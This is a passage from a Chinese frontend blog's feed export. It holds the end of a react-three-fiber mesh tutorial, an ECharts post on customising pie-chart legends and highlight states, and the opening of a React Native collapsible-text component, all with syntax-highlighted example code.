中如果我们想创建一个几何体，那么基本上都存在三步：</p><ul><li>实例化一个 Three 内置的几何对象（Geometry）</li><li>实例化一个材质（Material）对象</li><li>利用网格（Mesh）将两个对象结合</li></ul><p>最后生成的这个集合体我们就可以为其在空间中设置坐标，同时将其添加到场景（Scene）中，让它在空间中显示出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// create a sphere</span></span><br><span class="line"><span class="keyword">var</span> sphereGeometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">SphereGeometry</span>(<span class="number">4</span>, <span class="number">20</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> sphereMaterial = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshBasicMaterial</span>(&#123;<span class="attr">color</span>: <span class="number">0x7777ff</span>, <span class="attr">wireframe</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="keyword">var</span> sphere = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Mesh</span>(sphereGeometry, sphereMaterial);</span><br><span class="line"></span><br><span class="line"><span class="comment">// position the sphere</span></span><br><span class="line">sphere.<span class="property">position</span>.<span class="property">x</span> = <span class="number">20</span>;</span><br><span class="line">sphere.<span class="property">position</span>.<span class="property">y</span> = <span class="number">4</span>;</span><br><span class="line">sphere.<span class="property">position</span>.<span class="property">z</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add the sphere to the scene</span></span><br><span class="line">scene.<span class="title function_">add</span>(sphere);</span><br></pre></td></tr></table></figure><p>如果我们想要在 RTF 中进行同样的操作，那么我们只需要创建一个 <code>Mesh</code> 组件，然后用其包裹一个几何对象和材质对象即可：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;mesh position=&#123;[<span class="number">20</span>, <span class="number">4</span>, <span class="number">2</span>]&#125;&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">sphereGeometry</span> <span class="attr">args</span>=<span class="string">&#123;[4,</span> <span class="attr">20</span>, <span class="attr">20</span>]&#125; <span class="attr">attach</span>=<span class="string">&quot;geometry&quot;</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">meshBasicMaterial</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">color</span>=<span class="string">&#123;0xff0000&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">wireframe</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">attach</span>=<span class="string">&quot;material&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  /&gt;</span></span></span><br><span class="line">&lt;/mesh&gt;</span><br></pre></td></tr></table></figure><blockquote><p>Tips：在 RTF 中可以使用 <code>args</code> 参数来进行传参，如：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sphereGeometry args=&#123;[<span class="number">4</span>, <span class="number">20</span>, <span class="number">20</span>]&#125; attach=<span class="string">&quot;geometry&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>等同于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sphereGeometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">SphereGeometry</span>(<span class="number">4</span>, <span class="number">20</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><p>此外，如果是定义一个 Geometry 或者是 Material，必须为其添加 <code>attach</code> 属性进行声明。</p></blockquote><h2 id="3-4-完整示例："><a href="#3-4-完整示例：" class="headerlink" title="3.4 完整示例："></a>3.4 完整示例：</h2><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Canvas</span></span><br><span class="line">  camera=&#123;&#123;</span><br><span class="line">    <span class="attr">fov</span>: <span class="number">45</span>,</span><br><span class="line">    <span class="attr">aspect</span>: <span class="variable language_">window</span>.<span class="property">innerWidth</span> / <span class="variable language_">window</span>.<span class="property">innerHeight</span>,</span><br><span class="line">    <span class="attr">near</span>: <span class="number">0.1</span>,</span><br><span class="line">    <span class="attr">far</span>: <span class="number">1000</span>,</span><br><span class="line">    <span class="attr">position</span>: [-<span class="number">30</span>, <span class="number">40</span>, <span class="number">30</span>],</span><br><span class="line">  &#125;&#125;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">axesHelper</span> <span class="attr">args</span>=<span class="string">&#123;[20]&#125;</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">position</span>=<span class="string">&#123;[15,</span> <span class="attr">0</span>, <span class="attr">0</span>]&#125; <span class="attr">rotation</span>=<span class="string">&#123;[-0.5</span> * <span class="attr">Math.PI</span>, <span class="attr">0</span>, <span class="attr">0</span>]&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">planeGeometry</span> <span class="attr">args</span>=<span class="string">&#123;[60,</span> <span class="attr">20</span>, <span class="attr">1</span>, <span class="attr">1</span>]&#125; <span class="attr">attach</span>=<span class="string">&quot;geometry&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meshBasicMaterial</span> <span class="attr">color</span>=<span class="string">&#123;0xcccccc&#125;</span> <span class="attr">attach</span>=<span class="string">&quot;material&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">position</span>=<span class="string">&#123;[-4,</span> <span class="attr">4</span>, <span class="attr">0</span>]&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">boxGeometry</span> <span class="attr">args</span>=<span class="string">&#123;[4,</span> <span class="attr">4</span>, <span class="attr">4</span>]&#125; <span class="attr">attach</span>=<span class="string">&quot;geometry&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meshBasicMaterial</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">color</span>=<span class="string">&#123;0xff0000&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">wireframe</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">attach</span>=<span class="string">&quot;material&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">position</span>=<span class="string">&#123;[20,</span> <span class="attr">4</span>, <span class="attr">2</span>]&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">sphereGeometry</span> <span class="attr">args</span>=<span class="string">&#123;[4,</span> <span class="attr">20</span>, <span class="attr">20</span>]&#125; <span class="attr">attach</span>=<span class="string">&quot;geometry&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meshBasicMaterial</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">color</span>=<span class="string">&#123;0xff0000&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">wireframe</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">attach</span>=<span class="string">&quot;material&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Canvas</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4. 参考资料"></a>4. 参考资料</h1><ul><li><a href="https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1X7411F744%3Ffrom%3Dsearch%26seid%3D16228307511649123560">Games101(现代计算机图形学入门)</a></li><li><a href="https://aotu.io/notes/2017/08/28/getting-started-with-threejs/index.html">凹凸实验室：ThreeJS现学现卖</a></li><li><a href="https://coding.imooc.com/class/282.html">慕课：ThreeJS实战</a></li><li><a href="https://www.youtube.com/watch?v=3OYNerkxI-U">DirectX 和 OpenGL：游戏为什么离不开他们</a></li><li><a href="https://item.jd.com/12113317.html">Three.js开发指南：WebGL的JavaScript 3D库</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> 图形学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECharts —— Pie 图自定义方案</title>
      <link href="/2020/07/3b344edce8d0.html"/>
      <url>/2020/07/3b344edce8d0.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Legend"><a href="#1-Legend" class="headerlink" title="1. Legend"></a>1. Legend</h1><p>在 Echarts 中，我们经常会出现设计师设计的 Legend 与实际 Echarts 自带的 Legend 不符的情况，这时候我们往往要重新自定义 Legend。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200723101015.png" alt=""></p><h2 id="1-1-自定义-icon"><a href="#1-1-自定义-icon" class="headerlink" title="1.1 自定义 icon"></a>1.1 自定义 icon</h2><h4 id="修改-icon-类型"><a href="#修改-icon-类型" class="headerlink" title="修改 icon 类型"></a>修改 icon 类型</h4><p>对于 icon 的修改，可以在 <a href="https://echarts.apache.org/zh/option.html#legend.icon">legend.icon</a> 配置项下进行修改，其提供了一下几种基本样式：’circle’, ‘rect’, ‘roundRect’, ‘triangle’, ‘diamond’, ‘pin’, ‘arrow’, ‘none’，此外还允许用户使用 ‘image://url’ 设置为图片，其中 URL 为图片的链接，或者 dataURI。</p><h4 id="为不同的数据设置不同的-icon"><a href="#为不同的数据设置不同的-icon" class="headerlink" title="为不同的数据设置不同的 icon"></a>为不同的数据设置不同的 icon</h4><p>如果我们想为不同类型的数据设置不同的 icon，那我们必须手动指定。首先我们要在 <a href="https://echarts.apache.org/zh/option.html#legend.data">legend.data</a> 中使用 <code>legend.data.name</code> 明确指定每个 legend item 对应指定的数据，其次就可以使用 <code>legend.data.icon</code> 来指定每条数据的 icon 长什么样了。</p><h2 id="1-2-自定义文本"><a href="#1-2-自定义文本" class="headerlink" title="1.2 自定义文本"></a>1.2 自定义文本</h2><h4 id="使用-formatter-格式化文本"><a href="#使用-formatter-格式化文本" class="headerlink" title="使用 formatter 格式化文本"></a>使用 formatter 格式化文本</h4><p>对于文本格式，可以使用 <a href="https://echarts.apache.org/zh/option.html#legend.formatter">legend.formatter</a> 来进行设置，其可以是字符串也可以是一个函数。</p><p>当我们使用字符串来进行设置时，可以使用 <code>&#123;name&#125;</code> 来获取到当前 legend item 指示的数据 name，如： <code>Legend &#123;name&#125;</code>。</p><p>当我们使用函数来进行设置时，就为我们提供了更丰富的操作空间。函数的参数即为当前 legend item 所指示的数据 name，凭借这个数据 name，我们可以在数据堆中找到对应数据，实现数据值的显示，甚至计算当前数据所占的百分比。</p><h4 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h4><p>此时我们可使用 <a href="https://echarts.apache.org/zh/option.html#legend.textStyle">legend.textStyle</a> 对文字的样式进行配置整体样式进行简单的配置。</p><p>但是仅仅配置整体样式有可能无法满足我们想要的操作，比如我们想要让 legend 文本的 name 部分显示为浅色，其数据部分显示为深色加粗，如下图所示：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200723113439.png" alt=""></p><p>那么简单的使用 <code>textStyle</code> 只能指定全段文本的样式，无法将其分开定制样式。因此当需求更加复杂，我们想要操作更多的样式，那么就可以考虑使用 <a href="https://echarts.apache.org/zh/option.html#legend.textStyle.rich">legend.textStyle.rich</a> 来使用富文本对文字进行格式配置，具体示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">legend</span>: &#123;</span><br><span class="line">  <span class="attr">formatter</span>: [</span><br><span class="line">      <span class="string">&#x27;&#123;a|这段文本采用样式a&#125;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;&#123;b|这段文本采用样式b&#125;这段用默认样式&#123;x|这段用样式x&#125;&#x27;</span></span><br><span class="line">  ].<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>),</span><br><span class="line">  <span class="attr">textStyle</span>: &#123;</span><br><span class="line">    <span class="attr">rich</span>: &#123;</span><br><span class="line">      <span class="attr">a</span>: &#123;</span><br><span class="line">          <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">          <span class="attr">lineHeight</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">b</span>: &#123;</span><br><span class="line">          <span class="attr">backgroundColor</span>: &#123;</span><br><span class="line">              <span class="attr">image</span>: <span class="string">&#x27;xxx/xxx.jpg&#x27;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">height</span>: <span class="number">40</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">x</span>: &#123;</span><br><span class="line">          <span class="attr">fontSize</span>: <span class="number">18</span>,</span><br><span class="line">          <span class="attr">fontFamily</span>: <span class="string">&#x27;Microsoft YaHei&#x27;</span>,</span><br><span class="line">          <span class="attr">borderColor</span>: <span class="string">&#x27;#449933&#x27;</span>,</span><br><span class="line">          <span class="attr">borderRadius</span>: <span class="number">4</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义-legend-的选中效果"><a href="#自定义-legend-的选中效果" class="headerlink" title="自定义 legend 的选中效果"></a>自定义 legend 的选中效果</h4><p>默认情况下，legend item 选中后，<code>series（系列）</code> 中对应的数据就会在图例中消使，同时被选中的 legend 会呈现灰色的状态。我们可以使用 <a href="https://echarts.apache.org/zh/option.html#legend.inactiveColor">legend.inactiveColor</a> 配置项来改变图例被关闭时的颜色。</p><p>但是需要注意，如果我们使用富文本样式，同时在富文本样式中对文字的颜色进行了设置，那么如果我们选中了对应的 legend item，其颜色就不会变灰，因此并不推荐使用富文本设置文字颜色。如果要设置颜色，请在 <code>legend.textStyle.color</code> 中进行设置。</p><h2 id="1-3-使用-DOM-结构实现自定义-Legend"><a href="#1-3-使用-DOM-结构实现自定义-Legend" class="headerlink" title="1.3 使用 DOM 结构实现自定义 Legend"></a>1.3 使用 DOM 结构实现自定义 Legend</h2><p>随着 Legend 的定制效果越来越复杂，我们其实可以放弃 echarts 内置的 legend，自己通过 DOM 结构来实现一个 legend。DOM 结构实现很简单，重点是怎么去与图表进行交互。</p><p>在原始的交互过程中，legend 无非两种状态，一种选中状态，一种取消状态，其控制了图表中的数据是否展示。我们可以通过外部创建一个 DOM 结构，获取其点击事件，通过在点击事件中改变  <a href="https://echarts.apache.org/zh/option.html#legend.selected">legend.selected</a> 配置项来动态配置被选中的数据，这样就能模拟数据交互。</p><p>或者如果我们可以获取到 echarts 实例，我们就可以通过派发事件来模拟点击 legend。</p><p>再或者我们可以动直接态改 series 的数据本分来将图表中的数据直接移除或添加。</p><h1 id="2-显示效果"><a href="#2-显示效果" class="headerlink" title="2. 显示效果"></a>2. 显示效果</h1><h2 id="2-1-自定义鼠标移动到-Pie-图上时的高亮样式"><a href="#2-1-自定义鼠标移动到-Pie-图上时的高亮样式" class="headerlink" title="2.1 自定义鼠标移动到 Pie 图上时的高亮样式"></a>2.1 自定义鼠标移动到 Pie 图上时的高亮样式</h2><p>当鼠标移动到 Pie 图上时，其会进入一个 <code>emphasis</code> 状态：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200723134742.png" alt=""></p><p>我们可以通过 <a href="https://echarts.apache.org/zh/option.html#series-pie.emphasis">series-pie.emphasis</a> 来配置这个高亮效果，其中支持了 <code>label</code>、<code>line</code>、<code>itemStyle</code> 这些配置项。</p><p>此外，对于 Pie 图来说，每条 data 中都可以使用 <a href="https://echarts.apache.org/zh/option.html#series-pie.data.emphasis">series-pie.data.emphasis</a> 配置对应的 <code>emphasis</code> 效果。</p><h2 id="2-2-选中状态"><a href="#2-2-选中状态" class="headerlink" title="2.2 选中状态"></a>2.2 选中状态</h2><p>我们可以在 <a href="https://echarts.apache.org/zh/option.html#series-pie.selectedMode">series-pie.selectedMode</a> 中选择开启饼图选中的显示效果，这个效果默认是关闭的，开启后用户鼠标单击饼图时饼图就会与原来的位置产生一个位移，如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200723123449.png" alt=""></p><p>如果不开启 selectedMode 的话，可以通过 <a href="https://echarts.apache.org/zh/option.html#series-pie.data.selected">series-pie.data.selected</a> 配置项来手动指定当前数据是否被选中。</p><p>如果想要自定义选中时显示的位移距离的话，可以使用 (series-pie.selectedOffset)[<a href="https://echarts.apache.org/zh/option.html#series-pie.selectedOffset]">https://echarts.apache.org/zh/option.html#series-pie.selectedOffset]</a> 配置项来指定位移量。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Echarts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReactNative下实现文本折叠的效果</title>
      <link href="/2020/07/26bea935f195.html"/>
      <url>/2020/07/26bea935f195.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-场景"><a href="#1-场景" class="headerlink" title="1. 场景"></a>1. 场景</h2><p>在默认情况下，文本显示两行，同时未显示全的文字要有省略号的效果：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200722194115.png" alt=""></p><p>当用户点击展开按钮后，可以展开全部文本：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200722194228.png" alt=""></p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><p>在 RN 中 <code>&lt;Text&gt;</code> 组件拥有一个 props 为 <code>numberOfLines</code> 可以用来显示文本的行数，如果超出文本行数，文本就会用 <code>...</code> 来表示，我们可以利用这个特性来控制文本是否展开显示。</p><p>但是又有一个新的需求：<strong>如果文本没有超过两行，那就不应该显示展开按钮</strong>。</p><p>要想实现这个需求，就必须动态的判断文本的高度，但是在 RN 中我们无法直接获取组件的 layout，好在 <code>&lt;Text&gt;</code> 组件还提供了一个事件函数 <code>onLayout</code>，这个方法会在布局产生变化后被触发，函数的参数传递了一个事件对象，事件对象中包含了一个 <code>layout</code> 对象，这样我们就可以获取到文本块的高度了。</p><p>其次我们可以利用 <code>行高*允许显示的行数</code> 来获取到允许显示的文本块的最大高度，也就是文本溢出的最大高度。那么我们只需要将前面获取到的 <strong>文本块实际高度</strong> 与 <strong>溢出的最大高度</strong> 进行对比，就能判断出该文本是否是溢出文本，入下伪代码可以表示我们目前的思路：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [isOverflow, setIsOverflow] = useState&lt;<span class="built_in">boolean</span>&gt;(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">const</span> lineHeight = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">const</span> numberOfLines = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Text</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">numberOfLines</span>=<span class="string">&#123;numberOfLines&#125;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">onLayout</span>=<span class="string">&#123;(e)</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-xml">      const &#123;height&#125; = e.layout</span></span><br><span class="line"><span class="language-xml">      if(height &gt; lineHeight * numberOfLines) &#123;</span></span><br><span class="line"><span class="language-xml">        setIsOverflow(true)</span></span><br><span class="line"><span class="language-xml">      &#125;else&#123;</span></span><br><span class="line"><span class="language-xml">        setIsOverflow(false)</span></span><br><span class="line"><span class="language-xml">      &#125;</span></span><br><span class="line"><span class="language-xml">    &#125;&#125;&gt;</span></span><br><span class="line"><span class="language-xml">    文本内容文本内容文本内容文本内容文本内容文本内容文本内容文本内容文本内容文本内容</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">Text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>按照如上代码 <code>setIsOverflow</code> 可以很准确的来判断出文本是否溢出。但是再往后面进行，如果我们把文本折叠起来，<code>onLayout</code> 方法就会重新再被执行，此时已经被折叠的文本的高度理论上是完全等于 <code>lineHeight * numberOfLines</code> 的，那么再经过上面的判断，<code>isOverflow</code> 会被设置为 <code>false</code>，文本被标识为非溢出文本，展开按钮相应的也就消失掉了，我们的文本无法再次展开。</p><p>看来上面这条路是走不通的，要想实现准确的判断我们就必须获取到文本初始时的高度，那么我们可能又会想是否可以在 <code>onLayout</code> 第一次触发时去记录并对比文本块的高度，当文本再折叠后就不去计算文本的高度了。这是一个好方法，但是它违背了我们 React 组件的设计逻辑。因为如果传入的 Text 文本是动态改变的，那么如果文本再前一秒是个 10 行的文字，在下一秒是个 1 行的文字，要想实现高度的重新计算我们就必须将组建移除再重新渲染（重新清空 state）的状态，这样不管是用户使用还是性能上来说都是很差的。</p><p>因此还有一个方案，我们去设计两块文本，这两块的文本内容一模一样，但是其作用不一样：</p><ul><li>一块文本用于展示以及交互，他的高度是可被操作且动态改变的；</li><li>另一块文本是被隐藏的，但是它的结构还是存在的，同时它的高度是固定的。</li></ul><p>这样我们只需要从被隐藏的文本身上来获取真正的文本高度，但是只操作显示文本的高度，那么我们就可以准确的获取到真正的文本原始高度了。</p><p>隐藏的文本要注意以下几点：</p><ol><li>文本脱离文档流，不能有任何占位</li><li>行高以及宽度要与普通文本一致</li><li><code>z-index</code> 必须为负值，不能影响可见文本的交互</li><li>使用 <code>opacity</code> 进行隐藏</li></ol><h2 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3. 代码实现"></a>3. 代码实现</h2><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123;useState&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">View</span>, <span class="title class_">Text</span>, <span class="title class_">StyleProp</span>, <span class="title class_">TextStyle</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;react-native&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AntDesign</span> <span class="keyword">from</span> <span class="string">&#x27;react-native-vector-icons/AntDesign&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IOverflowText</span> &#123;</span><br><span class="line">  <span class="attr">numberOfLines</span>: <span class="built_in">number</span>; <span class="comment">// 超出该行数文字被隐藏</span></span><br><span class="line">  <span class="attr">linHeight</span>: <span class="built_in">number</span>; <span class="comment">// 文字行高</span></span><br><span class="line">  style?: <span class="title class_">StyleProp</span>&lt;<span class="title class_">TextStyle</span>&gt;; <span class="comment">// 文字样式</span></span><br><span class="line">  children?: <span class="built_in">string</span>; <span class="comment">// 文字内容</span></span><br><span class="line">  onChange?: <span class="function">(<span class="params">hide: <span class="built_in">boolean</span></span>) =&gt;</span> <span class="built_in">void</span>; <span class="comment">// 当展开、隐藏状态切换时触发的函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">OverflowText</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">IOverflowText</span>&gt; = <span class="function">(<span class="params">&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">  style,</span></span></span><br><span class="line"><span class="params"><span class="function">  numberOfLines,</span></span></span><br><span class="line"><span class="params"><span class="function">  linHeight,</span></span></span><br><span class="line"><span class="params"><span class="function">  children = <span class="string">&#x27;&#x27;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  onChange,</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [hide, setHide] = useState&lt;<span class="built_in">boolean</span>&gt;(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [isOverflow, setIsOverflow] = useState&lt;<span class="built_in">boolean</span>&gt;(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Text</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">numberOfLines</span>=<span class="string">&#123;hide</span> ? <span class="attr">numberOfLines</span> <span class="attr">:</span> <span class="attr">undefined</span>&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;[style,</span> &#123;<span class="attr">lineHeight:</span> <span class="attr">linHeight</span>&#125;]&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span 